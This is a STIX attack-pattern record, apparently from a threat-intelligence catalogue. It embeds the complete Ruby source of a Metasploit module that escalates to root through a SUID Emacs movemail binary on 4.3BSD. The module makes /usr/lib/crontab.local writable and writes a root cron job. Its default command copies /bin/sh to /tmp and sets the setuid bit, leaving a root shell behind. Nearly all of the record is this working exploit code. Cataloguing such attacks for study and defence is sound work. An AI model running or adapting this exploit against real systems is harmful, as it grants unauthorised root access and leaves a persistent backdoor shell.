{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1329899d-32c6-4d2b-a511-e02b60449b96",
    "created": "2024-08-14T17:14:32.630812Z",
    "modified": "2024-08-14T17:14:32.630818Z",
    "name": "Emacs movemail Privilege Escalation",
    "description": " This module exploits a SUID installation of the Emacs movemail utility to run a command as root by writing to 4.3BSD's /usr/lib/crontab.local.  The vulnerability is documented in Cliff Stoll's book The Cuckoo's Egg. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/local/emacs_movemail.rb",
            "external_id": "emacs_movemail.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Emacs movemail Privilege Escalation',\n        'Description' => %q{\n          This module exploits a SUID installation of the Emacs movemail utility\n          to run a command as root by writing to 4.3BSD's /usr/lib/crontab.local.\n\n          The vulnerability is documented in Cliff Stoll's book The Cuckoo's Egg.\n        },\n        'Author' => [\n          'Markus Hess', # Discovery? atrun(8) exploit for sure\n          'Cliff Stoll', # The Cuckoo's Egg hacker tracker\n          'wvu' # Module and additional research\n        ],\n        'References' => [\n          %w[URL https://en.wikipedia.org/wiki/Movemail],\n          %w[URL https://en.wikipedia.org/wiki/The_Cuckoo%27s_Egg],\n          %w[URL http://pdf.textfiles.com/academics/wilyhacker.pdf],\n          %w[URL https://www.gnu.org/software/emacs/manual/html_node/efaq/Security-risks-with-Emacs.html],\n          %w[URL https://www.gnu.org/software/emacs/manual/html_node/emacs/Movemail.html],\n          %w[URL https://mailutils.org/manual/html_node/movemail.html]\n        ],\n        'DisclosureDate' => '1986-08-01', # Day unknown, assuming first of month\n        'License' => MSF_LICENSE,\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'SessionTypes' => %w[shell],\n        'Privileged' => true,\n        'Payload' => { 'BadChars' => \"\\n\", 'Encoder' => 'generic/none' },\n        'Targets' => [['/usr/lib/crontab.local', {}]],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/generic',\n          'CMD' => 'cp /bin/sh /tmp && chmod u+s /tmp/sh'\n        },\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('MOVEMAIL', [true, 'Path to movemail', '/etc/movemail'])\n    ])\n  end\n\n  def bin_path\n    '/bin:/usr/bin:/usr/ucb:/etc'\n  end\n\n  def movemail\n    datastore['MOVEMAIL']\n  end\n\n  def crontab_local\n    '/usr/lib/crontab.local'\n  end\n\n  def crontab(cmd)\n    \"* * * * * root #{cmd}\\n* * * * * root rm -f #{crontab_local}\"\n  end\n\n  # uname(1) does not exist, technique from /etc/rc.local\n  def is_43bsd?\n    cmd_exec('strings /vmunix | grep UNIX').include?('4.3 BSD')\n  end\n\n  # id(1) does not exist\n  def root?\n    cmd_exec('whoami').include?('root')\n  end\n\n  # test -u does not exist\n  def setuid_root?(path)\n    cmd_exec(\"find #{path} -user root -perm -4000 -print\").include?(path)\n  end\n\n  def setup\n    super\n\n    vprint_status(\"Setting a sane $PATH: #{bin_path}\")\n\n    case cmd_exec('echo $SHELL')\n    when %r{/bin/sh}\n      vprint_status('Current shell is /bin/sh')\n      cmd_exec(\"PATH=#{bin_path}; export PATH\")\n    when %r{/bin/csh}\n      vprint_status('Current shell is /bin/csh')\n      cmd_exec(\"setenv PATH #{bin_path}\")\n    else\n      vprint_bad('Current shell is unknown')\n    end\n\n    vprint_status(\"$PATH is #{cmd_exec('echo $PATH').chomp}\")\n  end\n\n  def check\n    unless is_43bsd?\n      vprint_warning('System does not appear to be 4.3BSD')\n    end\n\n    unless file?(movemail)\n      vprint_bad(\"#{movemail} not found\")\n      return CheckCode::Safe\n    end\n\n    unless movemail.end_with?('movemail')\n      vprint_warning(\"#{movemail} has an unexpected name\")\n    end\n\n    unless setuid_root?(movemail)\n      vprint_status(\"Non-SUID-root #{movemail} found\")\n      return CheckCode::Detected\n    end\n\n    vprint_good(\"SUID-root #{movemail} found\")\n    CheckCode::Appears\n  end\n\n  def exploit\n    if root?\n      print_good('Session is already root, executing payload directly')\n      return cmd_exec(payload.encoded)\n    end\n\n    # outdesc = open (outname, O_WRONLY | O_CREAT | O_EXCL, 0666);\n    if file?(crontab_local)\n      fail_with(Failure::NoTarget, \"#{crontab_local} already exists\")\n    end\n\n    print_status('Preparing crontab with payload')\n    tab = crontab(payload.encoded)\n    vprint_line(tab)\n\n    # umask (umask (0) & 0333);\n    # (void) ftruncate (indesc, 0L);\n    print_status(\"Creating writable #{crontab_local}\")\n    cmd_exec(\"(umask 0 && #{movemail} /dev/null #{crontab_local})\")\n\n    unless writable?(crontab_local)\n      fail_with(Failure::NoAccess, \"#{crontab_local} is not writable\")\n    end\n\n    print_good(\"Writing crontab to #{crontab_local}\")\n    cmd_exec(\"echo '#{tab.gsub(\"'\", \"'\\\\\\\\''\")}' > #{crontab_local}\")\n    print_warning('Please wait at least one minute for effect')\n  end\nend\n",
    "x_mitre_disclosure_date": "1986-08-01, # Day unknown, assuming first of month",
    "x_mitre_platforms": [
        "unix'"
    ]
}